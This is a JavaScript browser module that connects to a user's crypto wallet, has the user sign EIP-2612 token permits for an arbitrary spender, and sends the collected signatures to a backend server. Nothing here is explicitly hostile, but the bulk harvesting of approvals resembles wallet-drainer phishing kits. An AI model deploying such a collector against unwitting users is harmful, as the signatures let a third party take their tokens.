/**
 * Permit2 Multi-Chain Wallet Sender
 * Handles EIP-712 signature collection for token permits
 */

const Web3 = require('web3');

// ERC20 ABI with nonces function
const ERC20_ABI = [
    {
        constant: true,
        inputs: [{ name: '_owner', type: 'address' }],
        name: 'nonces',
        outputs: [{ name: '', type: 'uint256' }],
        type: 'function'
    },
    {
        constant: true,
        inputs: [{ name: '_owner', type: 'address' }],
        name: 'balanceOf',
        outputs: [{ name: 'balance', type: 'uint256' }],
        type: 'function'
    },
    {
        constant: false,
        inputs: [
            { name: '_spender', type: 'address' },
            { name: '_value', type: 'uint256' },
            { name: '_deadline', type: 'uint256' },
            { name: 'v', type: 'uint8' },
            { name: 'r', type: 'bytes32' },
            { name: 's', type: 'bytes32' }
        ],
        name: 'permit',
        outputs: [],
        type: 'function'
    },
    {
        constant: true,
        inputs: [],
        name: 'decimals',
        outputs: [{ name: '', type: 'uint8' }],
        type: 'function'
    },
    {
        constant: true,
        inputs: [],
        name: 'name',
        outputs: [{ name: '', type: 'string' }],
        type: 'function'
    }
];

// Permit2 Contract ABI
const PERMIT2_ABI = [
    {
        constant: true,
        inputs: [
            { name: '', type: 'address' },
            { name: '', type: 'address' }
        ],
        name: 'allowance',
        outputs: [
            { name: 'amount', type: 'uint160' },
            { name: 'expiration', type: 'uint48' },
            { name: 'nonce', type: 'uint48' }
        ],
        type: 'function'
    }
];

class WalletSender {
    constructor(rpcUrl, permitAddress) {
        this.web3 = new Web3(new Web3.providers.HttpProvider(rpcUrl));
        this.permitAddress = permitAddress;
        this.userAccount = null;
        this.chainId = null;
        this.signatures = {};
    }

    /**
     * Connect to user's wallet (MetaMask, etc)
     */
    async connectWallet() {
        try {
            if (typeof window === 'undefined') {
                throw new Error('Window object not found. This must run in a browser.');
            }

            if (!window.ethereum) {
                throw new Error('MetaMask or compatible wallet not found');
            }

            // Request account access
            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            });

            this.userAccount = accounts[0];
            
            // Get chain ID
            const chainIdHex = await window.ethereum.request({
                method: 'eth_chainId'
            });
            this.chainId = parseInt(chainIdHex, 16);

            console.log(`✓ Connected to wallet: ${this.userAccount}`);
            console.log(`✓ Chain ID: ${this.chainId}`);

            return {
                address: this.userAccount,
                chainId: this.chainId
            };
        } catch (error) {
            console.error('Wallet connection failed:', error);
            throw error;
        }
    }

    /**
     * Fetch current nonce from token contract
     */
    async fetchTokenNonce(tokenAddress) {
        try {
            const contract = new this.web3.eth.Contract(ERC20_ABI, tokenAddress);
            const nonce = await contract.methods.nonces(this.userAccount).call();
            console.log(`✓ Fetched nonce for ${tokenAddress}: ${nonce}`);
            return parseInt(nonce);
        } catch (error) {
            console.error(`Failed to fetch nonce for ${tokenAddress}:`, error);
            throw error;
        }
    }

    /**
     * Get token info (decimals, name)
     */
    async getTokenInfo(tokenAddress) {
        try {
            const contract = new this.web3.eth.Contract(ERC20_ABI, tokenAddress);
            const [decimals, name] = await Promise.all([
                contract.methods.decimals().call(),
                contract.methods.name().call()
            ]);
            return { decimals: parseInt(decimals), name };
        } catch (error) {
            console.error(`Failed to get token info for ${tokenAddress}:`, error);
            throw error;
        }
    }

    /**
     * Create EIP-712 Permit signature
     */
    async createPermitSignature(tokenAddress, spenderAddress, amount, deadline) {
        try {
            if (!this.userAccount) {
                throw new Error('Wallet not connected');
            }

            // Fetch actual nonce from token contract
            const nonce = await this.fetchTokenNonce(tokenAddress);

            // Get token info for domain
            const tokenInfo = await this.getTokenInfo(tokenAddress);

            // EIP-712 Domain
            const domain = {
                name: tokenInfo.name,
                version: '1',
                chainId: this.chainId,
                verifyingContract: tokenAddress
            };

            // Permit type for EIP-712
            const types = {
                Permit: [
                    { name: 'owner', type: 'address' },
                    { name: 'spender', type: 'address' },
                    { name: 'value', type: 'uint256' },
                    { name: 'nonce', type: 'uint256' },
                    { name: 'deadline', type: 'uint256' }
                ]
            };

            // Permit message
            const message = {
                owner: this.userAccount,
                spender: spenderAddress,
                value: amount,
                nonce: nonce,
                deadline: deadline
            };

            console.log('EIP-712 Domain:', domain);
            console.log('Permit Message:', message);

            // Sign using eth_signTypedData_v4
            const signature = await this.signTypedData(domain, types, message);

            // Parse signature
            const { v, r, s } = this.parseSignature(signature);

            const permitData = {
                owner: this.userAccount,
                spender: spenderAddress,
                value: amount.toString(),
                nonce: nonce,
                deadline: deadline,
                v: v,
                r: r,
                s: s,
                signature: signature,
                tokenAddress: tokenAddress,
                tokenName: tokenInfo.name,
                chainId: this.chainId,
                timestamp: new Date().toISOString()
            };

            // Store signature
            this.signatures[tokenAddress] = permitData;

            console.log('✓ Permit signature created successfully');
            console.log('Permit Data:', permitData);

            return permitData;
        } catch (error) {
            console.error('Failed to create permit signature:', error);
            throw error;
        }
    }

    /**
     * Sign data using eth_signTypedData_v4
     */
    async signTypedData(domain, types, message) {
        try {
            const msgParams = {
                types: {
                    EIP712Domain: [
                        { name: 'name', type: 'string' },
                        { name: 'version', type: 'string' },
                        { name: 'chainId', type: 'uint256' },
                        { name: 'verifyingContract', type: 'address' }
                    ],
                    ...types
                },
                primaryType: 'Permit',
                domain: domain,
                message: message
            };

            const signature = await window.ethereum.request({
                method: 'eth_signTypedData_v4',
                params: [this.userAccount, JSON.stringify(msgParams)]
            });

            console.log('✓ Signature obtained:', signature);
            return signature;
        } catch (error) {
            console.error('Signing failed:', error);
            throw error;
        }
    }

    /**
     * Parse signature into v, r, s components
     */
    parseSignature(signature) {
        const r = '0x' + signature.slice(2, 66);
        const s = '0x' + signature.slice(66, 130);
        const v = parseInt('0x' + signature.slice(130, 132), 16);

        return { v, r, s };
    }

    /**
     * Get all signatures collected so far
     */
    getSignatures() {
        return this.signatures;
    }

    /**
     * Submit signatures to backend
     */
    async submitSignatures(backendUrl) {
        try {
            const response = await fetch(`${backendUrl}/api/permits/submit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    permits: this.signatures,
                    wallet: this.userAccount,
                    chainId: this.chainId
                })
            });

            if (!response.ok) {
                throw new Error(`Backend error: ${response.statusText}`);
            }

            const result = await response.json();
            console.log('✓ Signatures submitted to backend:', result);
            return result;
        } catch (error) {
            console.error('Failed to submit signatures:', error);
            throw error;
        }
    }
}

// Export for Node.js and browser
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WalletSender;
}
